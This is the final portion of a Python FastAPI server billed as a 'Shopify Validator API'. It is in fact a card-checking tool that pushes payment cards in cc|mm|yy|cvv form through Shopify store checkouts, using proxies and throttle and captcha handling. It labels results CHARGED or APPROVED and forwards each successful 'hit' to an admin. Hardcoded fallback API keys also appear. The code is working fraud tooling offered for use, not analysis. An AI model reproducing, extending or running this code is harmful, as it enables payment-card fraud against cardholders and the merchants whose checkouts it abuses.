                                         reason=f"Payment failed: {raw[:120]}")
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break
                return R("CARD_DECLINED", reason="Empty/unknown receipt state")

            if stype == "SubmitFailed":
                raw = str(s_data.get("reason") or "")
                return R(classify_raw(raw), raw=raw, reason=f"Submit failed: {raw[:120]}")

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                best_code = "CARD_DECLINED"
                raw_collected = []
                for err_item in errs:
                    for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                "localizedMessageHtml"):
                        val = str(err_item.get(fld) or "").upper()
                        if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED", "PAYMENT ERROR"):
                            continue
                        raw_collected.append(val[:80])
                        norm = classify_raw(val)
                        if norm != "CARD_DECLINED":
                            best_code = norm
                            break
                    if best_code != "CARD_DECLINED":
                        break
                raw = " | ".join(raw_collected) or str(errs)
                return R(best_code, raw=raw, reason=f"Submit rejected: {raw[:120]}")

            if stype == "Throttled":
                return R("THROTTLED", reason="Site throttled submit")
            if stype == "CheckpointDenied":
                return R("CAPTCHA_REQUIRED",
                         reason="Checkpoint denied at submit",
                         detail="Residential proxy required")

            return R("CARD_DECLINED", reason=f"Unexpected submit result: {stype}")

        except (asyncio.TimeoutError, RequestsError):
            return R("SITE_ERROR", reason="Request timed out")
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            return R("SITE_ERROR",
                     reason=f"Exception: {type(ex).__name__}: {str(ex)[:120]}")
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.get("/shopify")
async def shopify_route(
    site:       str           = Query(..., description="Shopify store URL"),
    cc:         Optional[str] = Query(None, description="cc|mm|yy|cvv"),
    proxy:      Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    variant_id: Optional[str] = Query(None, description="Specific product variant ID"),
    max_price:  Optional[float] = Query(None, description="Max total (product+ship+tax)"),
    key:        Optional[str] = Query(None, description="API Key"),
):
    secret = os.environ.get("SHOPII_API_KEY", "GHOSTXOWNER!!!")
    if key != secret:
        return JSONResponse({"error": "Unauthorized API key"}, status_code=401)
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available"}, status_code=400)
        card = random.choice(cards)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, variant_id=variant_id, proxy_str=proxy,
        max_price=max_price if max_price is not None else MAX_PRICE,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    if result.get("Charged") == "True" or result.get("Approved") == "True":
        status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
        asyncio.ensure_future(send_hit_to_admin(
            card=result.get("CC", ""),
            status=status_label,
            response=result.get("Response", ""),
            gateway=result.get("Gate", "UNKNOWN"),
            price=result.get("Price", "0.00"),
            site=site,
        ))

    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:       str           = Query(..., description="Shopify store URL"),
    card:       Optional[str] = Query(None, description="cc|mm|yy|cvv"),
    proxy:      Optional[str] = Query(None, description="ip:port"),
    variant_id: Optional[str] = Query(None, description="Specific product variant ID"),
    max_price:  Optional[float] = Query(None, description="Max total (product+ship+tax)"),
    key:        Optional[str] = Query(None, description="API Key"),
):
    secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
    if key != secret:
        return JSONResponse({"error": "Unauthorized API key"}, status_code=401)
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available"}, status_code=400)
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"

    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, variant_id=variant_id, proxy_str=proxy,
        max_price=max_price if max_price is not None else MAX_PRICE,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    if result.get("Charged") == "True" or result.get("Approved") == "True":
        status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
        asyncio.ensure_future(send_hit_to_admin(
            card=result.get("CC", ""),
            status=status_label,
            response=result.get("Response", ""),
            gateway=result.get("Gate", "UNKNOWN"),
            price=result.get("Price", "0.00"),
            site=site,
        ))

    code = result.get("Response", "")
    is_dead = code == "SITE_ERROR" and "Could not fetch products" in result.get("Reason", "")
    return JSONResponse({"valid": not is_dead, **result})


@app.get("/health")
async def health_route():
    return JSONResponse({
        "status":           "ok",
        "version":          "5.0.0",
        "cards_loaded":     len(_get_cards()),
        "workers":          WORKERS,
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "max_price":        MAX_PRICE,
        "cache_ttl":        CACHE_TTL,
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


@app.middleware("http")
async def add_timing(request: Request, call_next):
    t0   = time.time()
    resp = await call_next(request)
    resp.headers["X-Response-Time"] = f"{(time.time() - t0)*1000:.1f}ms"
    _stats["total_requests"] += 1
    return resp


if __name__ == "__main__":
    print(
        f"\n{'='*60}\n"
        f"  Shopify Validator API  v5.0\n"
        f"  Port:            {PORT}\n"
        f"  Workers:         {WORKERS}\n"
        f"  Max total price: ${MAX_PRICE:.2f}\n"
        f"{'='*60}\n"
    )
    _loop = "asyncio" if sys.platform == "win32" else "uvloop"
    _workers = WORKERS if sys.platform != "win32" else 1
    uvicorn.run(
        "api:app",
        host="0.0.0.0",
        port=PORT,
        workers=_workers,
        loop=_loop,
        http="httptools",
        log_level="warning",
        access_log=False,
        timeout_keep_alive=65,
        limit_concurrency=10000,
        limit_max_requests=500_000,
        backlog=8192,
    )
